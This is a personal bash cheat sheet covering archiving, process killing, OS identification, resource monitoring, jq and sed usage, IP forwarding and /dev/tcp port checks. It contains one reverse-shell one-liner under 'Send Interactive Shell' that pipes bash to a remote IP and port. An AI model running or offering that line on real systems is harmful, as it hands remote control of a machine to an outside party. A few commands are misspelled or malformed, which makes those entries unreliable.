## cheatsheet
https://devhints.io/bash

## Define file as a script
#!/bin/bash

## Kill prcoces ##
- kill -9 [PID]

## unTar files
tar -xvzf file.tar.gz

## Tar file
tar -czvf [name-of-archive.tar.gz] [/path/to/directory-or-file]

## Zip File
zip myfile.zip filename.txt

## zip folder
zip -r myfile.zip folder 

## Unzip file
unzip file.zip

# Unzip .gz or .txt.gz
gunzip [file]

## Unzip with pasword
unzip -P [pasword] file.zip

## Comands for identifi os system ##
- cat /etc/issue
- cat /etc/os-release
- cat /proc/version
- dmesg | head -1
- cat /etc/redhat-release
- lsb_release -a
- cat /etc/lsb-release 

## Basic Loope in console command ##
- while true; do echo gas; sleep 2; done

## Monitoring sistem resources ##
- while true; do top -b2|head -n20; vmstat; lsof |wc -l; sleep 1; done

## Monitorin hard memory ######
- while true; do echo '------------------------------';df -h; sleep 2; done

## Count lines ##
- [command] | wc -l

## Monitoring process use kernell calls ##cro	
- strace -p [pid-number] -ff

## Concatener archivos ##
- cat [file-1] [file-2] [file-3] > [full-file]

## Clean duplicate entris on file ##
- sort -u [file] > [clean_file]

## Send Interactive Shell
- bash -i >& /dev/tcp/192.168.1.37/8080 0>&1

## Split string by simbol ##
- comanf bash | tr -s '-s '

## Create Alias ##
alias example="command"

## Add user to sudo users ##
sudo usermod -a -G sudo [username]

## Create daemon ##
- https://askubuntu.com/questions/919054/how-do-i-run-a-single-command-at-startup-using-systemd
-  https://unix.stackexchange.com/questions/426862/proper-way-to-run-shell-script-as-a-daemon

## Read File line by line 
#!/bin/bash
input="/path/to/txt/file"
while IFS= read -r line
do
  echo "$line"
done < "$input"

## Create MD5 
echo -n example | md5sum

## Filter JSON
comand | jq '.[key].[key]'
comand | jq -r '.[key].[key]'

## Work with JSON output
[command] | jq '.key.subkey[]-subsubkey'
[command] | jq -r '.key'

## View all enviroment variables
printenv | less 

## Obtain MAC addres
ip link

## Change pasword
passwd

## Check if var entris on script are empty
if [ -z "$var" ]
then
      echo "\$var is empty"
else
      echo "\$var is NOT empty"
fi

## Replace string in file
sed -i 's/search_string/replace_string/' filename

## Replace from pipe
[comand] | sed 's/search_string/replace_string/'

## Copi from console to clipboad
cat [file] | clip
xclip -sel clip < [file]

## Pass args and flags to a script
https://unix.stackexchange.com/questions/140840/using-getopts-to-parse-options-after-a-non-option-argument?rq=1

## Modify Banner
nano .bashrc
	
## Modify banner
nano /etc/motd

## Get timestamp
date +"%s"

## View string in binary
string [binarifile]

## Split string
	my_string="Ubuntu;Linux Mint;Debian;Arch;Fedora"
	IFS=';' read -ra my_array <<< "$my_string"

	#Print the split string
	for i in "${my_array[@]}"
	do
	    echo $i
	done

## Package information
dpkg -s [package_name]

# Review package forwarding status
cat /proc/sys/net/ipv4/ip_forward

# Enable package forwarding persistence
sudo nano /etc/sysctl.conf
	> uncoment: net.ipv4.ip_forward=1
sudo sysctl -p

## Clean base64 file with jump lines
cat [base64file_with_trhas] | grep '[a-z0-9]' | base64 -d > clean_base64

## Test conexion without curl or netcat or ping
timeout 1 bash -c "</dev/tcp/[hostname]/[Port]" && echo "Port open" || echo "Port closed"
timeout 1 bash -c "</dev/tcp/ifconfig.io/443" && echo "Port open" || echo "Port closed"

## Echo salto de linea
echo -e "\n"